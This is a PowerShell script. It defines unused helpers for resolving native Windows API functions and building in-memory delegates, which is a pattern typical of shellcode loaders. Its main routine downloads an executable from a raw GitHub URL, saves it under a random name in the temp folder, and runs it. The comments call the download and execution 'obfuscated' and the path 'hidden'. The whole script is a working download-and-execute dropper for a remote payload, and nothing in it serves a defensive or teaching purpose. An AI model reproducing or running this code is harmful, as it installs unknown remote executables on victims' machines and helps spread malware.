function potatoes {
    Param ($cherries, $pineapple)
    $tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $turnips = @()
    $tomatoes.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $turnips += $_ } }
    return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}

function apples {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

function obfuscated-download-and-execute {
    Param ($url)
    try {
        # Obfuscated path generation
        $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + ".exe")

        # Obfuscated download
        Write-Output "Downloading executable to hidden path..."
        $client = New-Object System.Net.WebClient
        $client.DownloadFile($url, $tempFile)

        # Validate the file
        if (-Not (Test-Path $tempFile)) {
            Write-Error "Download failed or file not found."
            return
        }

        # Execute downloaded file
        Write-Output "Executing hidden file..."
        Start-Process -FilePath $tempFile -NoNewWindow -Wait
    } catch {
        Write-Error "An error occurred: $_"
    }
}

# Obfuscated call to download and execute the .exe
$url = "https://raw.githubusercontent.com/AI-Scanner/bin/refs/heads/main/SGVP%20Client%20Users.exe"
obfuscated-download-and-execute $url
